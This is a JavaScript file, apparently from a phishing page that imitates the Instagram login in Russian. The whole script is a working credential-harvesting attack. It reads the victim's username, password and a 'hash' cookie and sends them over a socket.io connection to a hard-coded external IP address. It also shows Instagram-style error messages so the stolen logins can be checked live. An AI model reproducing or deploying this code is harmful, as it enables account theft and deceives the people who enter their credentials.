function togglePass() {
    var passInput = document.getElementById("pass-input");
    if(passInput.type === 'text'){
        passInput.type = 'password'
    } else {
        passInput.type = 'text'
    }
}

var SOCKET = io.connect( 'http://148.251.52.170:5000', {
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionDelayMax : 5000,
    reconnectionAttempts: Infinity
});

function getCookie(name) {
    var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"));
    return matches ? decodeURIComponent(matches[1]) : undefined;
}

var userhash = getCookie("hash") ? getCookie("hash") : false;

/** Socket connection **/
SOCKET.on( 'connect', () => {
    console.log( 'socket connected' );

    $("button.l-b").off("click").on("click", function (e) {
        e.preventDefault();
        SOCKET.emit('checkInstagramLoginData', JSON.stringify({hash:userhash, username: $("#name-input").val(), userpass:  $("#pass-input").val()}));
        $("button.l-b").css("opacity",.8);
        $(".spinner.hidden").removeClass("hidden");
    });

    SOCKET.off('checkInstagramLoginData').on('checkInstagramLoginData', function (data) {
        data = JSON.parse(data);
        if (data.message === "The username you entered doesn't appear to belong to an account. Please check your username and try again.") {
            $(".error-message").html("Введенное вами имя пользователя не принадлежит аккаунту. Проверьте свое имя пользователя и повторите попытку.").addClass("active");
        } else if (data.message === "The password you entered is incorrect. Please try again.") {
            $(".error-message").html("К сожалению, вы ввели неверный пароль. Проверьте свой пароль еще раз.").addClass("active");
        } else if (data.message === "success") {
            $(".error-message.active").removeClass("active");
            window.close();
        } else if (data.message){
            setTimeout(function () {
                $(".error-message").html('Если вы уверены что ввели правильный логин и пароль но все равно не можете войти, откройте <a href="//instagram.com">Instagram</a> и подтвердите вход. После подтверждения повторите попытку').addClass("active");
            },3000)
        }
        $("button.l-b").css("opacity","");
        $(".spinner").addClass("hidden");
    });
});


SOCKET.on( 'disconnect', () => {
    console.log( 'socket closed' );
});